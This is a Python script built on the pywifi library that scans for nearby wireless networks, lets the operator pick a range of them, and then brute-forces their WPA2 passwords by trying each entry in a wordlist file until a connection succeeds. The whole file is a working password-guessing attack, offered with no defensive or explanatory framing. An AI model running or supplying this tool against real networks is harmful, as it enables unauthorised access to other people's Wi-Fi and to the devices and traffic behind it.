#!/usr/bin/env python
# coding=utf-8

import pywifi
import time
from pywifi import const

def test_connect(key, iface, profiles):
    for p in profiles:
        print('Try key[{}] for {}'.format(key, p.ssid))
        p.key = key
        iface.disconnect()
        time.sleep(1)
        #iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(p)
        iface.connect(tmp_profile)
        time.sleep(10)
        if iface.status() == const.IFACE_CONNECTED:
            print(p.ssid, '[{}]'.format(p.key))
            return True
        else:
            pass


wifi = pywifi.PyWiFi()
iface = wifi.interfaces()[0]

print('Your network device:\n* {}\n'.format(iface.name()))

print('Start scanning...')

iface.scan()
time.sleep(8)
rets = iface.scan_results()
wifi_ssid = set()
profiles = []
for i,v in enumerate(rets):
    try:
        if v.ssid not in wifi_ssid:
            wifi_ssid.add(v.ssid)
            profile = pywifi.Profile()
            profile.ssid = v.ssid
            profile.auth = const.AUTH_ALG_OPEN
            profile.akm.append(const.AKM_TYPE_WPA2PSK)
            profile.cipher = const.CIPHER_TYPE_CCMP
            profiles.append(profile)
    except UnicodeEncodeError:
        pass

for i,p in enumerate(profiles):
    print(i, p.ssid)

print('Input the start and end position to track:')
x, y = [int(x) for x in input().split()]

with open('wordlist.txt') as fp:
    for line in fp:
        print(line.strip())
        ret = test_connect(line.strip(), iface, profiles[x:y])
        if ret:
            break
